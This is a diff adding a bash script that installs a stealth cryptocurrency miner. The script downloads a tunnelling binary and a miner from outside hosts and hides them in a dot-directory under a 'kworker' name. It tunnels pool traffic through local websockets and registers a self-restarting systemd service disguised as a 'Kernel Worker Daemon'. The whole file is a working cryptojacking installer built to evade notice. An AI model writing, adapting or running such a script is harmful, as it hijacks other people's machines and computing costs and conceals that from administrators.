@@ -1,0 +1,147 @@
+#!/bin/bash
+
+# ==========================================
+# Stealth Perl Miner Auto-Installer
+# ==========================================
+
+set -e # Exit on error
+
+# --- Configuration ---
+WALLET="prl1p2jan4dvkdfkt5r3pra7z96axrxjyjcgat9w7ldetlcy9wffm569sc9ux2t"
+WORKER_NAME=$(hostname -s)
+POOL_HOST="pearl-sg1.lproute.com"
+POOL_PORT="3360"
+
+# Paths
+INSTALL_DIR="/opt/.kworker"
+SERVICE_NAME="kworker"
+SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"
+WRAPPER_SCRIPT="${INSTALL_DIR}/start_tunnel.sh"
+LOG_FILE="${INSTALL_DIR}/logs/miner.log"
+
+# Colors for output
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+NC='\033[0m' # No Color
+
+echo -e "${GREEN}[+] Starting Stealth Miner Setup...${NC}"
+
+# 1. Create Directories
+echo -e "${YELLOW}[*] Creating directories...${NC}"
+mkdir -p ${INSTALL_DIR}
+mkdir -p ${INSTALL_DIR}/logs
+cd ${INSTALL_DIR}
+
+# 2. Download Binaries
+echo -e "${YELLOW}[*] Downloading wstunnel...${NC}"
+if [ ! -f "kworker_bin" ]; then
+    curl -s -L -o wstunnel.tar.gz https://storage.technoelectro.online/wstunnel_10.5.2_linux_amd64.tar.gz
+    tar -xzf wstunnel.tar.gz --strip-components=1
+    mv wstunnel kworker_bin
+    chmod +x kworker_bin
+    rm -f wstunnel.tar.gz
+    echo -e "${GREEN}[+] wstunnel downloaded and renamed to 'kworker_bin'.${NC}"
+else
+    echo -e "${YELLOW}[!] 'kworker_bin' already exists. Skipping download.${NC}"
+fi
+
+echo -e "${YELLOW}[*] Downloading Miner (forge)...${NC}"
+if [ ! -f "miner" ]; then
+    curl -s -L -o miner https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/forge
+    chmod +x miner
+    echo -e "${GREEN}[+] Miner downloaded.${NC}"
+else
+    echo -e "${YELLOW}[!] 'miner' already exists. Skipping download.${NC}"
+fi
+
+# 3. Create the Wrapper Script
+echo -e "${YELLOW}[*] Creating wrapper script...${NC}"
+cat > ${WRAPPER_SCRIPT} << EOF
+#!/bin/bash
+
+# Configuration
+WALLET="${WALLET}"
+WORKER_NAME=\$(hostname -s)
+POOL_HOST="${POOL_HOST}"
+POOL_PORT="${POOL_PORT}"
+LOG_FILE="${LOG_FILE}"
+
+# Generate Random Ports
+WS_PORT=\$(shuf -i 10000-65000 -n 1)
+TCP_PORT=\$(shuf -i 10000-65000 -n 1)
+
+echo "\$(date): Starting kworker... WS_PORT=\$WS_PORT, TCP_PORT=\$TCP_PORT" >> \$LOG_FILE
+
+# Start wstunnel server (Local WS Server)
+./kworker_bin server --addr ws://127.0.0.1:\${WS_PORT} --verbose error >> \$LOG_FILE 2>&1 &
+WS_PID=\$!
+
+# Start wstunnel client (Forward Local TCP to Remote Pool via Local WS)
+./kworker_bin client -L tcp://127.0.0.1:\${TCP_PORT}:\${POOL_HOST}:\${POOL_PORT} ws://127.0.0.1:\${WS_PORT} --verbose error >> \$LOG_FILE 2>&1 &
+WS_CLIENT_PID=\$!
+
+# Wait for tunnel to establish
+sleep 2
+
+# Start the Miner
+./miner --algorithm pearlhash \
+    --pool 127.0.0.1:\${TCP_PORT} \
+    --wallet \${WALLET} \
+    --worker \${WORKER_NAME} \
+    --log-level error >> \$LOG_FILE 2>&1 &
+MINER_PID=\$!
+
+# Keep the script alive (wait for any child to die)
+wait
+EOF
+
+chmod +x ${WRAPPER_SCRIPT}
+
+# 4. Create Systemd Service File
+echo -e "${YELLOW}[*] Creating Systemd Service...${NC}"
+cat > ${SERVICE_FILE} << EOF
+[Unit]
+Description=Kernel Worker Daemon
+After=network-online.target
+Wants=network-online.target
+
+[Service]
+Type=simple
+WorkingDirectory=${INSTALL_DIR}
+ExecStart=${WRAPPER_SCRIPT}
+Restart=always
+RestartSec=5
+StandardOutput=journal
+StandardError=journal
+SyslogIdentifier=${SERVICE_NAME}
+
+# Security Hardening
+NoNewPrivileges=true
+ProtectSystem=strict
+ProtectHome=read-only
+PrivateTmp=true
+Environment=HOME=/root
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+# 5. Enable and Start Service
+echo -e "${YELLOW}[*] Enabling and Starting Service...${NC}"
+systemctl daemon-reload
+systemctl enable ${SERVICE_NAME}.service
+systemctl restart ${SERVICE_NAME}.service
+
+# 6. Final Status
+echo ""
+echo -e "${GREEN}=========================================${NC}"
+echo -e "${GREEN} Setup Complete! ${NC}"
+echo -e " Service Name: ${SERVICE_NAME}.service"
+echo -e " Install Dir:  ${INSTALL_DIR}"
+echo -e " Log File:     ${LOG_FILE}"
+echo -e " Wallet:       ${WALLET}"
+echo ""
+echo -e " To check status: systemctl status ${SERVICE_NAME}"
+echo -e " To view logs:    tail -f ${LOG_FILE}"
+echo -e " To stop:         systemctl stop ${SERVICE_NAME}"
+echo -e "${GREEN}=========================================${NC}"
